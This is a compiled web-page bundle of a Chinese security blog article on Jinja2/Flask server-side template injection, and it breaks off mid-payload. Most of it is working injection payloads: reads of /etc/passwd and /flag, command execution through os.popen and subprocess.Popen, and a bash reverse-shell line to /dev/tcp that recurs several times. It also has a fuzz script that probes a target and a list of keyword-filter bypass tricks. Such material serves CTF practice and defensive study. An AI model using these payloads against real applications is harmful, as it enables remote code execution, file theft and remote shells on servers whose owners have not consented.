(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{395:function(s,a,t){"use strict";t.r(a);var n=t(3),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("blockquote",[a("p",[s._v("本文首发于安全客: https://www.anquanke.com/post/id/246094")])]),s._v(" "),a("h2",{attrs:{id:"_0x01-再看寻找python-ssti攻击载荷的过程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-再看寻找python-ssti攻击载荷的过程"}},[s._v("#")]),s._v(" 0x01 再看寻找Python SSTI攻击载荷的过程")]),s._v(" "),a("p",[s._v("获取基本类")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("对于返回的是定义的Class内的话:\n__dict__   //返回类中的函数和属性，父类子类互不影响\n__base__ //返回类的父类 python3\n__mro__ //返回类继承的元组，(寻找父类) python3\n__init__ //返回类的初始化方法   \n__subclasses__()  //返回类中仍然可用的引用  python3\n__globals__  //对包含函数全局变量的字典的引用 python3\n对于返回的是类实例的话:\n__class__ //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法\n''.__class__.__mro__[2]\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("此外，在引入了Flask/Jinja的相关模块后还可以通过")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("config\nrequest\nurl_for\nget_flashed_messages\nself\nredirect\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("等获取基本类,")]),s._v(" "),a("p",[s._v("获取基本类后，继续向下获取基本类(object)的子类")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("object.__subclasses__()\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("找到重载过的"),a("code",[s._v("__init__")]),s._v("类")]),s._v(" "),a("p",[s._v("在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的")]),s._v(" "),a("p",[s._v("也可以利用"),a("code",[s._v(".index()")]),s._v("去找"),a("code",[s._v("file")]),s._v(","),a("code",[s._v("warnings.catch_warnings")])]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__class__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__mro__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__subclasses__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__init__\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("slot wrapper "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'__init__'")]),s._v(" of "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'object'")]),s._v(" objects"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__class__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__mro__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__subclasses__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("59")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__init__\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("unbound method WarningMessage"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__init__"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("查看其引用"),a("code",[s._v("__builtins__")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file等函数来实现读取文件的功能")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("常用的目标函数有这么几个")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("file\nsubprocess.Popen\nos.popen\nexec\neval\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("常用的中间对象有这么几个")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1')\nlipsum.__globals__.__builtins__.open(\"/flag\").read()\nlinecache.os.system('ls')\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("更多的可利用类可以通过遍历筛选的方式找到")]),s._v(" "),a("p",[s._v("比如对"),a("code",[s._v("subprocess.Popen")]),s._v("我们可以构造如下fuzz脚本")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n\nurl "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n\nindex "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#print i")]),s._v("\n    payload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"{{''.__class__.__mro__[2].__subclasses__()[%d]}}\"")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    params "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"search"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" payload\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#print(params)")]),s._v("\n    req "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("params"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("params"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#print(req.text)")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"subprocess.Popen"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        index "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" i\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("break")]),s._v("\n\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"index of subprocess.Popen:"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("index"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}\"")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br")])]),a("p",[s._v("那么我们也可以利用"),a("code",[s._v("{%for%}")]),s._v("语句块来在服务端进行fuzz")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% for c in [].__class__.__base__.__subclasses__() %}\n  {% if c.__name__=='catch_warnings' %}\n  {{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('<command>').read()\") }}\n  {% endif %}\n{% endfor %}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"_0x02-一些trick"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-一些trick"}},[s._v("#")]),s._v(" 0x02 一些Trick")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("Python 字符的几种表示方式")]),s._v(" "),a("ul",[a("li",[s._v("16进制 "),a("code",[s._v("\\x41")])]),s._v(" "),a("li",[s._v("8进制 "),a("code",[s._v("\\101")])]),s._v(" "),a("li",[s._v("unicode "),a("code",[s._v("\\u0074")])]),s._v(" "),a("li",[s._v("base64 "),a("code",[s._v("'X19jbGFzc19f'.decode('base64')")]),s._v(" python3")]),s._v(" "),a("li",[s._v("join "),a("code",[s._v('"fla".join("/g")')])]),s._v(" "),a("li",[s._v("slice "),a("code",[s._v('"glaf"[::-1]')])]),s._v(" "),a("li",[s._v("lower/upper "),a("code",[s._v('["__CLASS__"|lower')])]),s._v(" "),a("li",[s._v("format "),a("code",[s._v('"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)')])]),s._v(" "),a("li",[s._v("replace "),a("code",[s._v('"__claee__"|replace("ee","ss")')])]),s._v(" "),a("li",[s._v("reverse "),a("code",[s._v('"__ssalc__"|reverse')])])])]),s._v(" "),a("li",[a("p",[s._v("python字典或列表获取键值或下标的几种方式")])])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("dict['__builtins__']\ndict.__getitem__('__builtins__')\ndict.pop('__builtins__')\ndict.get('__builtins__')\ndict.setdefault('__builtins__')\nlist[0]\nlist.__getitem__(0)\nlist.pop(0)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("ul",[a("li",[s._v("SSTI 获取对象元素的几种方式\n"),a("ul",[a("li",[a("code",[s._v("class.attr")])]),s._v(" "),a("li",[a("code",[s._v("class.__getattribute__('attr')")])]),s._v(" "),a("li",[a("code",[s._v("class['attr']")])]),s._v(" "),a("li",[a("code",[s._v("class|attr('attr')")])]),s._v(" "),a("li",[a("code",[s._v('"".__class__.__mro__.__getitem__(2)')])]),s._v(" "),a("li",[a("code",[s._v("['__builtins__'].__getitem__('eval')")])]),s._v(" "),a("li",[a("code",[s._v("class.pop(40)")])])])]),s._v(" "),a("li",[s._v("request 旁路注入")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("request.args.name    #GET name\nrequest.cookies.name #COOKIE name\nrequest.headers.name #HEADER name\nrequest.values.name  #POST or GET Name\nrequest.form.name    #POST NAME\nrequest.json         #Content-Type json\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("ul",[a("li",[s._v("通过拿到"),a("code",[s._v("current_app")]),s._v("这个对象获取当前"),a("code",[s._v("flask App")]),s._v("的上下文信息，实现config读取")])]),s._v(" "),a("p",[s._v("比如")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{url_for.__globals__.current_app.config}}\n{{url_for.__globals__['current_app'].config}}\n{{get_flashed_messages.__globals__['current_app'].config.}}\n{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].cofig}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h2",{attrs:{id:"_0x03-bypass的手段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-bypass的手段"}},[s._v("#")]),s._v(" 0x03 Bypass的手段")]),s._v(" "),a("p",[s._v("在对Jinjia SSTI注入时，本质是在Jinja的沙箱中进行代码注入，因此很多绕过技巧和python沙箱逃逸是共通的")]),s._v(" "),a("h3",{attrs:{id:"模板标签过滤"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#模板标签过滤"}},[s._v("#")]),s._v(" {{}}模板标签过滤")]),s._v(" "),a("ul",[a("li",[a("code",[s._v("{% if xxx %}xxx{% endif %}")]),s._v("形式")])]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__class__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__mro__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__subclasses__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("59")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__init__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("func_globals"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("linecache"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("os"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("popen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'bash -i >& /dev/tcp/127.0.0.1/233 0>&1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" endif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ul",[a("li",[s._v("{% print xxx %} 形式")])]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__class__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__mro__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__subclasses__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("59")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("__init__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("func_globals"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("linecache"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("os"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("popen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'bash -i >& /dev/tcp/127.0.0.1/233 0>&1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"关键词过滤"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#关键词过滤"}},[s._v("#")]),s._v(" 关键词过滤")]),s._v(" "),a("p",[a("strong",[s._v("base64编码绕过")])]),s._v(" "),a("p",[a("code",[s._v("__getattribute__")]),s._v("使用实例访问属性时,调用该方法")]),s._v(" "),a("p",[s._v("例如被过滤掉"),a("strong",[s._v("class")]),s._v("关键词")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("字符串拼接绕过")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("利用dict拼接")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% set a=dict(o=x,s=xx)|join %}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("利用string")])]),s._v(" "),a("p",[s._v("比如"),a("code",[s._v("'")]),s._v("可以用下面方式拿到，存放在"),a("code",[s._v("quote")]),s._v("中")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% set quote = ((app.__doc__|list()).pop(337)|string())%}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("类似的还有")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% set sp = ((app.__doc__|list()).pop(102)|string)%}\n{% set pt = ((app.__doc__|list()).pop(320)|string)%}\n{% set lb = ((app.__doc__|list()).pop(264)|string)%}\n{% set rb = ((app.__doc__|list()).pop(286)|string)%}\n{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}\n{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("通过"),a("code",[s._v("~")]),s._v("可以将得到的字符连接起来")]),s._v(" "),a("p",[s._v("一个eval的payload如下所示")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% set xhx = (({ }|select()|string|list()).pop(24)|string)%}\n{% set sp = ((app.__doc__|list()).pop(102)|string)%}\n{% set pt = ((app.__doc__|list()).pop(320)|string)%}\n{% set quote = 